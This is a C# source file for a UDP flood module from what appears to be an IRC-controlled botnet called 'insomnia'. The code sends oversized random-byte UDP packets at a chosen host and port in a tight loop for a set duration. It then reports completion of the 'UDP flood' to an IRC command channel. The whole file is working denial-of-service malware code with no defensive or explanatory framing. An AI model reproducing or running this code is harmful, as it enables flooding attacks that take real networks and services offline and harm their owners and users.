using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;

namespace insomnia
{
    internal class UDP
    {
        public static string host;
        public static int delay;
        public static int port;
        public static bool isEnabled = false;

        public static void Begin()
        {
            int seconds = delay * 1000;
            new Thread(() => SendUDP(Functions.ipE(host, port))).Start();

            Thread.Sleep(seconds);

            if (isEnabled)
            {
                Stop();
                IRC.WriteMessage("UDP flood on" + IRC.ColorCode(" " + host) + " for" + IRC.ColorCode(" " + delay) + " seconds has finished.", Config._mainChannel());
            }
        }

        public static void Stop()
        {
            isEnabled = false;
        }

        private static void SendUDP(IPEndPoint ip)
        {
            Socket s = new Socket(ip.AddressFamily, SocketType.Dgram, ProtocolType.Udp);

            while (isEnabled)
            {
                try
                {
                    s.SendTo(udpRandom(), ip);
                }
                catch
                {
                    s = null;
                    s = new Socket(ip.AddressFamily, SocketType.Dgram, ProtocolType.Udp);

                    Thread.Sleep(2000);
                }
                Thread.Sleep(1);
            }

            // Cleanup
            s = null;
        }

        private static byte[] udpRandom()
        {
            byte[] b = new byte[Functions.rand.Next(1470, 2000)];
            Functions.rand.NextBytes(b);
            return b;
        }
        
    }
}
